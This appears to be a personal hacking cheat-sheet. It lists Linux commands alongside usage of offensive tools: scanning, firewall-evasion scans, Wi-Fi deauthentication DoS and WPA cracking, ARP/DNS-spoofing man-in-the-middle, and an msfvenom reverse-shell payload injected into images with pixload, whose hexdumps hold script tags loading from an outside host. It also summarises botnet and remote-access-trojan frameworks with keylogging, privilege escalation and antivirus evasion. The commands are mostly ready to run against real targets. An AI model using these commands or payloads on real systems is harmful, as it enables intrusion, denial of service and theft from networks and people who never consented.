#NOTES





************************************************************************************************************************************
#Linux Terminal Commands

"this can be used to move around the terminal and gain access to linux devices check the notes after the commands for details most commands come with options use --help to list them in some cases noramlly they are the command followed by something like :EXAMPLE: -a or -b or -l for :EXAMPLE: ls -a instead of just typing ls knowing terminal commands is a must to become a good hacker and or pentester also they can help you when it comes time to do some bash scripting"



history           "will show you commands you entered in the past"

clear             "will clear the terminal"

ls                "list files"

ls -la            "list files and its permssions and other info"

ls -l

ls -CF

ls -A             "list all files even hidden ones"

del               "delete a file"

cp                "copy a file"

rmdir             "remove a directory"
 
mkdir             "make a directory"

rm                "remove a file add a file nmae after rm to remove that file"

mv                "move a file"

df                "shows amount of space on a file system"

pwd               "writes the full path name of the cuurent working directory"

dd                "Copy a file, converting and formatting according to the operands"

gzip              "this is a popular compression program for files use --help for more info"

find              "find files based on input from the user"

locate            "find  files with keywords :EXAMPLE: locate -i file name"
 
ifconfig          "List network info"

iwconfig          "List network info"

arp               "list network info like router internal ip address"

arp -a            "list network info like router internal ip address but with more details"   

netstat           "list active connections"

netstat -a        "list all active connections"

ping              "a command to test network conections"

traceroute     "this is like ping but it tells you each node aka server used to reach the end location of the network traffic add a website after the command to trace the route to that sites servers :EXAMPLE: traceroute www.google.com it shows the ip address of each node and its hostname and or dns"
 
host             "a command to find out host infoamtion of a ip address or host name"

route            "displays your routing table"

whoami           "see the user you are"

ps               "list current processes"

ps -a            "list ALL current processes and extra"

userdel          "delete a user"

adduser          "add a user"

cat              "read a file if its readable"

echo

chmod +x         "make a file excutable"

chmod 777        "makes a file full read and write and exacutable"

chown            "change owners of a file"

chroot

uname            "will print info about your system"

lsb_release -a              "check current kali or linux version"

cat /etc/os-release         "check current kali or linux version with more info"

cat /etc/passwd      "see passwords saved for users on some linux versions this can be used to gain the root password you can maybe use the info to break in via ssh for example it also has password hashes"

cat /etc/shadow    "see passwords saved for users on some linux versions this can be used to gain the root password you can maybe use the info to break in via ssh for example it also has password hashes you can use hashcat for example to crack the passwords to gain access"

su    "switch users use user name after su to pick which user to change to"

cat /etc/resolv.conf   "to see current dns server"

nano filename.txt     "this will take you to nano text editor name the file by changing filenmae.txt to the name you want this can be used to create files on a system not just txt files as well"

leafpad filename.txt   "this will take you to leafpad text editor name the file by changing filenmae.txt to the name you want this can be used to create files on a system not just txt files as well"

service   "starts a service use a name of a service and then follow the name by the command start to start the service you can also use stop and status""

service apache2 start     "start the apache server that can be used to host a wepage or website its very useful for hacking you can also use the command stop, restart, start, status after the service name to do those things""

python -m SimpleHTTPServer 80   "starts a python simple server on port 80 other ports can be used"

systemctlctl enable ssh     "this will turn said script use diable to disable the service or script"

irb              "enter irb use the exit command to exit"

exit             "exit from most scripts programs etc"

kill             "list the fuctions of kill this command can be used to kill task and processes"

nohup            "is a posix command to ignore the hup signal"

grep             " list the fuctions of grep and it can find a certain word in a file this can be used to delete or change a word in a file and more"

grep |     "grep with a pipe" 

grep --help      "explains the grep command in great detail"

--help           "this can be used after most commands to get help information it can be used for some scripts as well"

reboot           "restarts the computer"

suspend          "suspends the current process"

sleep            "puts the cpu to sleep"

jobs             "displays current running jobs"

bash --help      "gives you all the commands that can be used with the bash cammand and gives you info like your version number"

wget             "wget"

wget --help      "get the help list for the wget command"

wget -mk         "use this command followed by a website name to clone the website"

vi               "visual text editor" 

cron             "a time based scheduler this is used for many reasons like to help sys admins maintane software"

nslookup         "a network admin tool for queryring the DNS to get the ip or dns its similar to the host command type in the name of the website after entering the command or type the command the - websitename to use this command"  

netcat           "this is a tool used to transfer files or make shells it comes with most linux distros"  

tail

xargs

mount

fdisk

fsck

dmesg

dpkg

md5sum          "a program that calculates and verifies md5 hashes"

tty

env

init

modprobe

du

tee

passwd

echo

getopt




********************************************************************************************************************************** 
#How TO Use IPLocator 

python IPLocator.py -h         "this will pull up the help menu"

python IPLocator.py -i         "for interactive mode where you can in put an ip to be located"


Lookup location of IPaddress.

optional arguments:
  -h, --help            show this help message and exit
  -a a [a ...], --addr a [a ...]
                        IP Address to lookup
  -i                    Prompt for IP address at runtime
  --no-banner           Don't print banner



*****************************************************************************************************************************
#nmap commands and netdiscover for scanning the LAN
#nmap can scan for vunerblities and do so much more netdiscover collects ARP packets to collect data on devic
es on the LAN you are on nmap and masscan can be used to scan remote ip address as well as angry ip scanner below is info for all 3 they are recon tools which are some of the most important tools for pentesting


ls -al /usr/share/nmap/scripts | grep dns            "this is how you can check nmaps scripts that are stored on your device using key words this one use "dns" as its key word.


nmap -sn               "ping scan"

nmap -T4 -F            "quick scan"

nmap -T4 -A -v         "intense scan"

nmap -O 10.0.0.1       "find os info of a device or devices"

nmap -O -sV            "detects operation system info and does services enumeration of a device or devices"

nmap -O -sV -A 10.0.0.1    "detects OS type plus recons on the services intensely and agressively"

nmap -Pn 10.0.0.1/24    "uses ping sweeps a.k.a pings to do networking discovery"

nmap -p 5555 -A -v T4 193.181.41.68    "scan a target for a certain port only"

nmap -p 1-9999 -A -v T4 193.181.41.68    "scan a target for specified ports you choose which ones with the 1-9999 part of the command change it to include the port range you waant looked at for EX: "1-443"


#ADVANCED NMAP COMMADS
"Avoiding detection, firewalls and more"
nmap -f 72.167.23.2    "to send smaller more lowkey 8bite probs to avoid firewalls and detection"


nmap --mtu 8 10.73.31.145    "this allows you to change probe bites via 8s so 16, 32 etc"


nmap -D RND:10 10.73.31.145           "this will scan one target from multi positions confusing the target and helping the scan blend in the -D is for decoys you can choice decoy ip address via a comma in between them ex below"
  

nmap -D 10.73.31.145,72.167.23.2 10.0.0.1


"you can even use zombies to run the scan they must be itle though ex below the first listed ip is the zombie the 2nd ip is the target to be scaned"

nmap --sI 10.73.31.55 10.73.31.145

       
nmap --data-length 25 10.73.31.145             "this command allows you to send random data with your scan you can change the probes they are in bytes this is done where the 25 is this can help you get around firewalls as well"


nmap --sorce-port 54 10.73.31.145              "this lets you choce what port nmap uses to send the scan noramlly nmap does this at random all these things can help avoid detection and firewalls"



nmap --randomize-hosts 10.73.31.100-175          "this tells nmap to scan targets randomly not in order to avoid detection this reqires a rang as show on the end 100-175"



"THIS COMMAND allows you to SPOOF THE MAC ADDRESS of the device the scan is coming from some of these methods can be used at the same time all of them can be combined to avoid detecton, firewalls and remain lokey because nmap can set off bells and alarms the 0 tells nmap to use a random mac address"
nmap -sT -PN --spoof-mac 0 10.73.31.145


#DNS BRUTE FORCE WITH NMAP "gain dns records and sub domains"

nmap -p 53 --script dns-brute googl.com    "-p is the port you want to use"


******************************************************************************************************************************************************
#Netdiscover
netdiscover -i eth0    "scan the interface eth0 for devices"



**************************************************************************************************************************************************
#HOW TO USE MASSCAN

Tools included in the masscan package
masscan – Asynchronous TCP port scanner


"to start"
root@kali:~# masscan



"usage example:"
masscan -p80,8000-8100 10.0.0.0/8 --rate=10000
 scan some web ports on 10.x.x.x at 10kpps
masscan --nmap
 list those options that are compatible with nmap
masscan -p80 10.0.0.0/8 --banners -oB <filename>
 save results of scan in binary format to <filename>
masscan --open --banners --readscan <filename> -oX <savefile>
 read binary scan results in <filename> and save them as xml in <savefile>




masscan Usage Example

Scan for a selection of ports (-p22,80,445) across a given subnet (192.168.1.0/24):
root@kali:~# masscan -p22,80,445 192.168.1.0/24


#SCAN THE WHOLE INTERNET
masscan 0.0.0.0/0 -p5555 --rate 1000000 --exclude 255.255.255.255 10.0.0.0/8 192.168.0.0/16 172.16.0.0/12  

"scan the internet on port 443 using exclusions to not routable ip ranges this will find all ip address with port 443 open any port can be used"


masscan 0.0.0.0/0 -p443 --rate 1000000 --exclude 255.255.255.255 10.0.0.0/8 192.168.0.0/16 172.16.0.0/12 -oX results.txt 

"this will put the found info in a txt file named results using xml"




***********************************************************************************************************************************************************
DOS and DDOS attacks using botnets and other tools
#boot user from wifi using hping dos attacks

hping3 -S --flood -V "traget lan ip"


#boot user from wifi

hping3 -S --floof -V "traget lan ip"




"or use aireplay-ng"

airodump-ng wlan0mon  "scan for networks and gain info"

"dos attack a whole network"
aireplay-ng -0 0 -a 50:6A:03:C4:CB:A8 wlan0mon

aireplay-ng --deauth 20000 -a "place mac of access point" -c "place mac of client you want kicked off" wlan0mon



"dos attack just one device"
aireplay-ng -0 0 -a 78:F2:9E:6F:B1:E8 -c 40:4E:36:0C:26:1C wlan0mon

aireplay-ng -0 0 -a mac of router -c mac of target wlan0mon



#or start monitormode 
"set channel of chipset"
airmon-ng wlan0mon 6  "replace number with channel you want"

 airmon-ng start wlan0mon

 type airmon-ng airmon-ng check airmon-ng kill airmon-ng start wlan0mon

#scan local networks traffic


#listen to only one network
airodump-ng --channel 6 --bssid 78:F2:9E:6F:B1:E8 wlan0mon          "must replace mac and bssid with wifi network target station"


"or use evillimiter"

?  "for help"

scan   "start a scan"


hosts   "to find host from scan of network"


block 4     "use number to pick target block cuts all traffic you can also limit traffic"

limit 4      "limits traffic"


block all    "blocks all traffic dos attack"


free all   "stops all attack"

****************************************************************************************************
#use kismet to gain network info or netdiscover macs and ip address also airodump

netdiscover -i eth0

kismet -i eth0


*******************************************************************************************************************************************

#hack wifi

"set channel of chipset"
airmon-ng wlan0mon 11  "replace number with channel you want"

"shows all networks in area and info"
airodump-ng wlan0mon


"focus on a certain channel to listen to shows macs device on that network" 
airodump-ng -c 6 -w  ARLO_VMB_1593261733 --bssid 50:6A:03:C4:CB:A8 wlan0mon

airodump-ng -c 11 -w The Crib --bssid 4C:12:65:53:30:36 wlan0mon


"now deauth a client and capture a handshake use mac of router for bssid"
aireplay-ng -0 0 -a 78:F2:9E:6F:B1:E8 wlan0mon

aireplay-ng -0 0 -a 4C:12:65:53:30:36 wlan0mon 

"after 4 way handshake is caputred crack the hash with aircrack"
aircrack-ng -w /root/PasswordList.txt Fios-TechSureUserLog-5G-01.cap


4C:12:65:53:30:36

*****************************************************************************************************************************************************************************
#start wifi hacking
airodump-ng "SSID" -c "channel" --bssid "mac of target" wlan0mon

#scan for networks 
aireplay-ng -9 wlan0mn

#Start wifi hacking try for handshake
aireplay-ng --deauth 10 -a "place mac address of target" -c "mac of station number" wlan0mon

#now try to crack handshake if captured
aircrack-ng -w Drag wordlist to termianl for exact location path" -b "then mac under 2Nd bssid" "then drag cap file into terminal"

#check for unathenticated clients 
sudo airodump-ng --channel 2 --encrypt OPN wlan0mon

#how to boot people off the network
aireplay-ng -0 15 -a "mac address" -c Mac address" wlan0mon -0

"make 15 a 0 for unlimite death pakets"

#set channel of fake router
iwconfig wlan0mon channel 1

*************************************************************************************************************************************

#make Fake Networks appare
#becon flood 

mdk3 wlan0mon b -c 1         "make one fake network show up"

mdk3 wlan0mon b -c 1 -f         

mdk3 wlan0 b -c 1 -f       "to make fake random wifis show up add a txt file to make it say names you want"
"  

mdk3 wlan0 b -c 1 -f /root/Back Up Data/Fake_Network_List


*******************************************************************************************************************************************************************
#Basic Man In The Middle Attack With Terminal using Ettercap


echo 1 > /proc/sys/net/ipv4/ip_forward            "set up ip forwarding"

arpspoof -i eth0 -t 10.0.0.89 10.0.0.1  "target to gateway"

arpspoof -i eth0 -t 10.0.0.1 10.0.0.89  "gateway to target"

dnsspoof -i eth0 -f host.txt        "make a host file to use for dns spoofing"
 
or 

gedit /etc/ettercap/etter.dns   "to etdi ettercaps host file"

ettercap -i eth0 -T -q -P dns_spoof -M ARP /192.168.1.212// 


:example: for arp spoofing eith ettercap router ip goes first victums ip goes 2nd use wireshark to see packets use the command ip.addr == 192.168.1.248 to filter out other devices by ip address you can load your pcap files to apackets.com which will break down the file and show all its info"

ettercap -T -S -i eth0 -M arp:remote /192.168.1.1// /192.168.1.248//

*****************************************************************************************************************************************************
#how to use Driftnet and ettercap to scan the network for images and arp posion
you can use ettercap gui as well with man in the middle attack


to ethernet link off


ettercap -Tqi wlan0 -M arp:remote ///        "starts ettercap"




driftnet -i wlan0        "starts driftnet"



#or try when using a server

sysctl net.ipv4.ip_forward=1

iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT

iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT

net.ipv4.ip_forward = 1

driftnet -i eth0

*******************************************************************************************************************************
start tcpdump to capture data with man in the middle attack

tcpdump -i wlan0 -n port 80 and host 10.0.0.30



#set up ip forwarding for ettercap 

sysctl -w net.ipv4.ip_forward=1



#edit ettercap files 

nano /etc/ettercap/etter.conf       "ettercap config file"

nano /etc/ettercap/etter.dns        "ettercap host file"



#use ettercap dns spoof in termianl 

ettercap -T -q -i wlan0 -M arp:remote -P dns_spoof //10.0.0.1// //10.0.0.30//





******************************************************************************************************************************************************************
#How TO USE PIXload to inject backdoors in to images


#msfvenom

If you want to inject a metasploit payload, try something like this:

msfvenom -p php/meterpreter_reverse_tcp \
	LHOST=192.168.0.1 LPORT=31337 -f raw > payload.php
# Edit payload.php if need.
./pixload/png.pl -payload "$(cat payload.php)" -output payload.png




:Example:
./gif.pl -output payload.gif


./png.pl -output payload.png


./jpg.pl -place COM|DQT [-payload 'STRING'] -output payload.jpg






SETUP

The following Perl modules are required:

    GD

    Image::ExifTool

    String::CRC32

On Debian-based systems install these packages:

sudo apt install libgd-perl libimage-exiftool-perl libstring-crc32-perl

On OSX please refer to this workaround (thnx 2 @iosdec).
Docker

docker build -t pixload .
docker run -v "$(pwd):/pixload" -it --rm pixload

TOOLS
bmp.pl

BMP Payload Creator/Injector.

Create a minimal BMP Polyglot Image with custom/default payload, or inject payload into existing image.
Usage

./bmp.pl [-payload 'STRING'] -output payload.bmp

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be created.

Example

./bmp.pl -output payload.bmp

[>|       BMP Payload Creator/Injector      |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.bmp

[>] Injecting payload into payload.bmp
[✔] Payload was injected successfully

payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1

00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|
00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|
00000020  3d 31 3b 3c 73 63 72 69  70 74 20 73 72 63 3d 2f  |=1;<script src=/|
00000030  2f 6e 6a 69 2e 78 79 7a  3e 3c 2f 73 63 72 69 70  |/nji.xyz></scrip|
00000040  74 3e 3b                                          |t>;|
00000043

gif.pl

GIF Payload Creator/Injector.

Create a minimal GIF Polyglot Image with custom/default payload, or inject payload into existing image.
Usage

./gif.pl [-payload 'STRING'] -output payload.gif

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be generated.

Example

./gif.pl -output payload.gif

[>|      GIF Payload Creator/Injector       |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.gif

[>] Injecting payload into payload.gif
[✔] Payload was injected successfully

payload.gif: GIF image data, version 87a, 10799 x 32

00000000  47 49 46 38 37 61 2f 2a  20 00 80 00 00 04 02 04  |GIF87a/* .......|
00000010  00 00 00 2c 00 00 00 00  20 00 20 00 00 02 1e 84  |...,.... . .....|
00000020  8f a9 cb ed 0f a3 9c b4  da 8b b3 de bc fb 0f 86  |................|
00000030  e2 48 96 e6 89 a6 ea ca  b6 ee 0b 9b 05 00 3b 2a  |.H............;*|
00000040  2f 3d 31 3b 3c 73 63 72  69 70 74 20 73 72 63 3d  |/=1;<script src=|
00000050  2f 2f 6e 6a 69 2e 78 79  7a 3e 3c 2f 73 63 72 69  |//nji.xyz></scri|
00000060  70 74 3e 3b                                       |pt>;|
00000064

jpg.pl

JPG Payload Creator/Injector.

Create a minimal JPG Image with custom/default payload, or inject payload into existing image.

There are two ways for injecting:

    inject into COMMENT section

    inject into DQT table

Usage

./jpg.pl -place COM|DQT [-payload 'STRING'] -output payload.jpg

-place COM:
  The payload will be injected as a 'COMMENT'.

  If the output file exists, then the payload will be injected into the
  existing file.  Else the new one will be created.

-place DQT:
  The payload will be injected into 'DQT table'.

  LIMITATION:
    1. payload size must not exceed 64 bytes.
    2. no injection support, only new file generation.

  This is necessary in case the server application processes images and
  removes comments, application-specific data, etc.

  The data in DQT table must remain intact.

  ! If the output file exists, then it will be rewritten. !

Example

    DQT

./jpg.pl -place DQT -output payload.jpg

[>|      JPEG Payload Creator/Injector      |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.jpg

[>] Injecting payload into DQT table
[✔] Payload was injected succesfully

payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1

00000000  ff d8 ff db 00 43 00 01  01 01 01 01 01 01 01 01  |.....C..........|
00000010  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
00000020  01 01 01 01 01 01 01 01  3c 73 63 72 69 70 74 20  |........<script |
00000030  73 72 63 3d 2f 2f 6e 6a  69 2e 78 79 7a 3e 3c 2f  |src=//nji.xyz></|
00000040  73 63 72 69 70 74 3e ff  c2 00 0b 08 00 01 00 01  |script>.........|
00000050  01 01 11 00 ff c4 00 14  00 01 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00  00 03 ff da 00 08 01 01  |................|
00000070  00 00 00 01 3f ff d9                              |....?..|
00000077

    COMMENT

./jpg.pl -place COM -output payload.jpg

[>|      JPEG Payload Creator/Injector      |<]

    https://github.com/chinarulezzz/pixload


[>] Injecting payload into COMMENT
[✔] Payload was injected successfully

payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1

00000000  ff d8 ff fe 00 21 3c 73  63 72 69 70 74 20 73 72  |.....!<script sr|
00000010  63 3d 2f 2f 6e 6a 69 2e  78 79 7a 3e 3c 2f 73 63  |c=//nji.xyz></sc|
00000020  72 69 70 74 3e ff db 00  43 00 01 01 01 01 01 01  |ript>...C.......|
00000030  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
00000040  01 01 01 01 01 01 01 01  01 01 01 3c 73 63 72 69  |...........<scri|
00000050  70 74 20 73 72 63 3d 2f  2f 6e 6a 69 2e 78 79 7a  |pt src=//nji.xyz|
00000060  3e 3c 2f 73 63 72 69 70  74 3e ff c2 00 0b 08 00  |></script>......|
00000070  01 00 01 01 01 11 00 ff  c4 00 14 00 01 00 00 00  |................|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 03 ff da 00  |................|
00000090  08 01 01 00 00 00 01 3f  ff d9                    |.......?..|
0000009a

png.pl

PNG Payload Creator/Injector.

Create a PNG Image with custom/default payload, or inject payload into existing image.

The payload is injecting into IDAT data chunks.
Usage

./png.pl [-payload 'STRING'] -output payload.png

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be created.

Example

./png.pl -output payload.png

[>|      PNG Payload Creator/Injector       |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.png

[>] Injecting payload into payload.png

[+] Chunk size: 13
[+] Chunk type: IHDR
[+] CRC: fc18eda3
[+] Chunk size: 9
[+] Chunk type: pHYs
[+] CRC: 952b0e1b
[+] Chunk size: 25
[+] Chunk type: IDAT
[+] CRC: c8a288fe
[+] Chunk size: 0
[+] Chunk type: IEND

[>] Inject payload to the new chunk: 'pUnk'
[✔] Payload was injected successfully

payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced

00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|
00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|
00000030  c4 01 95 2b 0e 1b 00 00  00 19 49 44 41 54 48 89  |...+......IDATH.|
00000040  ed c1 31 01 00 00 00 c2  a0 f5 4f ed 61 0d a0 00  |..1.......O.a...|
00000050  00 00 6e 0c 20 00 01 c8  a2 88 fe 00 00 00 00 49  |..n. ..........I|
00000060  45 4e 44 ae 42 60 82 00  00 00 00 00 00 00 00 00  |END.B`..........|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000000c0  00 1f 70 55 6e 6b 3c 73  63 72 69 70 74 20 73 72  |..pUnk<script sr|
000000d0  63 3d 2f 2f 6e 6a 69 2e  78 79 7a 3e 3c 2f 73 63  |c=//nji.xyz></sc|
000000e0  72 69 70 74 3e 9d 11 54  97 00 49 45 4e 44        |ript>..T..IEND|
000000ee

webp.pl

WebP Payload Creator/Injector.

Create a WebP Polyglot Image with custom/default payload, or inject payload into existing image.
Usage

./webp.pl [-payload 'STRING'] -output payload.webp

Currently, there is no possibility to inject the payload into an existing
webp image.  Only the new (minimal) webp image will be created and your
payload will be injected into.

If the -output argument file exists, the payload will be injected into 
the existing image, but this image will be corrupted.

Example

[>|      WebP Payload Creator/Injector       |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.webp

[>] Injecting payload into payload.webp
[✔] Payload was injected successfully

payload.webp: RIFF (little-endian) data, Web/P image

00000000  52 49 46 46 2f 2a 00 00  57 45 42 50 56 50 38 4c  |RIFF/*..WEBPVP8L|
00000010  ff ff ff 00 2f 00 00 00  10 07 10 11 11 88 88 fe  |..../...........|
00000020  07 00 2a 2f 3d 31 3b 3c  73 63 72 69 70 74 20 73  |..*/=1;<script s|
00000030  72 63 3d 2f 2f 6e 6a 69  2e 78 79 7a 3e 3c 2f 73  |rc=//nji.xyz></s|
00000040  63 72 69 70 74 3e 3b                              |cript>;|
00000047






**************************************************************************************************************************************************
#how to use UFONET gui botnet and terminal botnet builder and ddos tool

./ufonet -h              "help menu"



./ufonet --download-zombies            "download zombies"



./ufonet --gui     "get gui version"



./ufonet --sd /botnet/dork.txt --sn bing         "get more zombies"












****************************************************************************************************************************************
#how to use BYOB to build your own botnet

BYOB is an open-source post-exploitation framework for students, researchers and developers. It includes features such as:

    Pre-built C2 server
    Custom payload generator
    12 post-exploitation modules

It is designed to allow students and developers to easily implement their own code and add cool new features without having to write a C2 server or Remote Administration Tool from scratch.

This project has 2 main parts: the original console-based application (/byob) and the web GUI (/web-gui).




#Web GUI
Dashboard

A control panel for your C2 server with a point-and-click interface for executing post-exploitation modules. The control panel includes an interactive map of client machines and a dashboard which allows efficient, intuitive administration of client machines.




#Payload Generator

The payload generator uses black magic involving Docker containers & Wine servers to compile executable payloads for any platform/architecture you select. These payloads spawn reverse TCP shells with communication over the network encrypted via AES-256 after generating a secure symmetric key using the Diffie-Hellman IKE.

payloads_preview




#Terminal Emulator

The web app includes an in-browser terminal emulator so you can still have direct shell access even when using the web GUI.





#client

Generate fully-undetectable clients with staged payloads, remote imports, and unlimited post-exploitation modules

    Remote Imports: remotely import third-party packages from the server without writing them to the disk or downloading/installing them
    Nothing Written To The Disk: clients never write anything to the disk - not even temporary files (zero IO system calls are made) because remote imports allow arbitrary code to be dynamically loaded into memory and directly imported into the currently running process
    Zero Dependencies (Not Even Python Itself): client runs with just the python standard library, remotely imports any non-standard packages/modules from the server, and can be compiled with a standalone python interpreter into a portable binary executable formatted for any platform/architecture, allowing it to run on anything, even when Python itself is missing on the target host
    Add New Features With Just 1 Click: any python script, module, or package you copy to the ./byob/modules/ directory automatically becomes remotely importable & directly usable by every client while your command & control server is running
    Write Your Own Modules: a basic module template is provided in ./byob/modules/ directory to make writing your own modules a straight-forward, hassle-free process
    Run Unlimited Modules Without Bloating File Size: use remote imports to add unlimited features without adding a single byte to the client's file size
    Fully Updatable: each client will periodically check the server for new content available for remote import, and will dynamically update its in-memory resources if anything has been added/removed
    Platform Independent: everything is written in Python (a platform-agnostic language) and the clients generated can optionally be compiled into a portable executable (Windows) or bundled into a standalone application (macOS)
    Bypass Firewalls: clients connect to the command & control server via reverse TCP connections, which will bypass most firewalls because the default filter configurations primarily block incoming connections
    Counter-Measure Against Antivirus: avoids being analyzed by antivirus by blocking processes with names of known antivirus products from spawning
    Encrypt Payloads To Prevent Analysis: the main client payload is encrypted with a random 256-bit key which exists solely in the payload stager which is generated along with it
    Prevent Reverse-Engineering: by default, clients will abort execution if a virtual machine or sandbox is detected



#Modules


Post-exploitation modules that are remotely importable by clients

    Persistence (byob.modules.persistence): establish persistence on the host machine using 5 different methods
    Packet Sniffer (byob.modules.packetsniffer): run a packet sniffer on the host network & upload .pcap file
    Escalate Privileges (byob.modules.escalate): attempt UAC bypass to gain unauthorized administrator privileges
    Port Scanner (byob.modules.portscanner): scan the local network for other online devices & open ports
    Keylogger (byob.modules.keylogger): logs the user’s keystrokes & the window name entered
    Screenshot (byob.modules.screenshot): take a screenshot of current user’s desktop
    Webcam (byob.modules.webcam): view a live stream or capture image/video from the webcam
    Outlook (byob.modules.outlook): read/search/upload emails from the local Outlook client
    Process Control (byob.modules.process): list/search/kill/monitor currently running processes on the host
    iCloud (byob.modules.icloud): check for logged in iCloud account on macOS
    Miner (byob.core.miner): mine Monero in the background using the built-in miner or XMRig



#Server



Command & control server with persistent database and console

    Console-Based User-Interface: streamlined console interface for controlling client host machines remotely via reverse TCP shells which provide direct terminal access to the client host machines
    Persistent SQLite Database: lightweight database that stores identifying information about client host machines, allowing reverse TCP shell sessions to persist through disconnections of arbitrary duration and enabling long-term reconnaissance
    Client-Server Architecture: all python packages/modules installed locally are automatically made available for clients to remotely import without writing them to the disk of the target machines, allowing clients to use modules which require packages not installed on the target machines





#Core



Core framework modules used by the generator and the server

    Utilities (byob.core.util): miscellaneous utility functions that are used by many modules
    Security (byob.core.security): Diffie-Hellman IKE & 3 encryption modes (AES-256-OCB, AES-256-CBC, XOR-128)
    Loaders (byob.core.loaders): remotely import any package/module/scripts from the server
    Payloads (byob.core.payloads): reverse TCP shell designed to remotely import dependencies, packages & modules
    Stagers (byob.core.stagers): generate unique payload stagers to prevent analysis & detection
    Generators (byob.core.generators): functions which all dynamically generate code for the client generator
    Database (byob.core.database): handles interaction between command & control server and the SQLite database
    Handler (byob.core.handler): HTTP POST request handler for remote file uploads to the server








****************************************************************************************************************************************************************************

download the deb file from the real website

the use 

dpkg -i ipscan_3.7.2_amd64.deb   "to install it"


the run it via find tools you can add it to your favorites for easy access 









********************************************************************************************************************************************************************************
#how to use SUBLISTER DOMAIN SCANNING TOOL to automate domain enumeration a tool for bug bounty and pentesters "it can also sub domain bruteforce as well as its passive recon using OSINT to gain dns records and sub domains we use the sub domains we find to llook for points of attack"

#INSTALL DIRECTONS
git clone https://github.com/aboul3la/Sublist3r.git
cd Sublist3r
sudo pip install -r requirements.txt


#USEAGE
OPTIONS:
  -h, --help            show this help message and exit
  -d DOMAIN, --domain DOMAIN
                        Domain name to enumerate it's subdomains
  -b [BRUTEFORCE], --bruteforce [BRUTEFORCE]
                        Enable the subbrute bruteforce module
  -p PORTS, --ports PORTS
                        Scan the found subdomains against specified tcp ports
  -v [VERBOSE], --verbose [VERBOSE]
                        Enable Verbosity and display results in realtime
  -t THREADS, --threads THREADS
                        Number of threads to use for subbrute bruteforce
  -e ENGINES, --engines ENGINES
                        Specify a comma-separated list of search engines
  -o OUTPUT, --output OUTPUT
                        Save the results to text file
  -n, --no-color        Output without color

#EXAMPLES "you can use python to run the script or ./ because its already executable if it not executable type "sudo chmod +x sublister" to make the script executable this will fix any errors you may have had" 
python ./sublist3r.py -d google.com


./sublist3r.py -d -v google.com   "a verbose scan"


./sublist3r.py -d -v -p google.com    "scan the domains ports they can be limited using "--ports 80 8080 443 22" for example


./sublist3r.py -d google.com -o /root/domanlist.txt "save the domains to a txt file use a file path and name the file"
"cat /root/domainlist.txt" to see the file on the terminal


********************************************************************************************************
#HOW TO INSTALL AND USE FIERCE DOMAIN SCANNER / MAPPER / BRUTE FORCE TOOL

intallation:
$ git clone https://github.com/mschwager/fierce.git
$ cd fierce
$ python -m pip install -r requirements.txt
$ python fierce/fierce.py -h


python fierce/fierce.py -h



Let's start with something basic:

$ fierce --domain google.com --subdomains accounts admin ads

Traverse IPs near discovered domains to search for contiguous blocks with the --traverse flag:

$ fierce --domain facebook.com --subdomains admin --traverse 10

Limit nearby IP traversal to certain domains with the --search flag:

$ fierce --domain facebook.com --subdomains admin --search fb.com fb.net

Attempt an HTTP connection on domains discovered with the --connect flag:

$ fierce --domain stackoverflow.com --subdomains mail --connect

Exchange speed for breadth with the --wide flag, which looks for nearby domains on all IPs of the /24 of a discovered domain:

$ fierce --domain facebook.com --wide

Zone transfers are rare these days, but they give us the keys to the DNS castle. zonetransfer.me is a very useful service for testing for and learning about zone transfers:

$ fierce --domain zonetransfer.me

To save the results to a file for later use we can simply redirect output:

$ fierce --domain zonetransfer.me > output.txt

Internal networks will often have large blocks of contiguous IP space assigned. We can scan those as well:

$ fierce --dns-servers 10.0.0.1 --range 10.0.0.0/24

Check out --help for further information:

$ fierce --help





***************************************************************************************************************************
#HOW TO USE DNSMAP DNS NETWORK MAPPER "DNS BRUTE FORCING"


dnsmap
dnsmap 0.35 - DNS Network Mapper

usage: dnsmap <target-domain> [options]

options:
-w <wordlist-file>
-r <regular-results-file>
-c <csv-results-file>
-d <delay-millisecs>
-i <ips-to-ignore> (useful if you're obtaining false positives)

"eamples below"
dnsmap example.com
dnsmap google.com -w yrockyou.txt -r /root/domain_brute_force_results.txt
dnsmap example.com -r /tmp/ -d 3000
dnsmap example.com -r ./domainbf_results.txt


dnsmap google.com -w /root/seclist/jhaddix.txt -r /root/domain_brute_force_results.txt

***************************************************************************************************************************************************************************
"use pyinstaller to my a py file a exe file"

pyinstller --onefile /root/test.py






********************************************************************************************************************************************************************************************************************************
how to install and use pup rat "remote access tool

cd pupy 

git submodule init

git submodule update 


cd pupy 

python pip install -r requirements.txt





************************************************************************************************************************************
#how to use Parat Almost fud romte admin tool

help  "help list"

generate "to genreate payload type"

-i "for local host ex:" 192.168.1.77

-p "for the port EX:" 443

-a "for ach x86 , x64  or x32"

-t "for the devcie type a.k.a platform" EX: windows, linux, mac

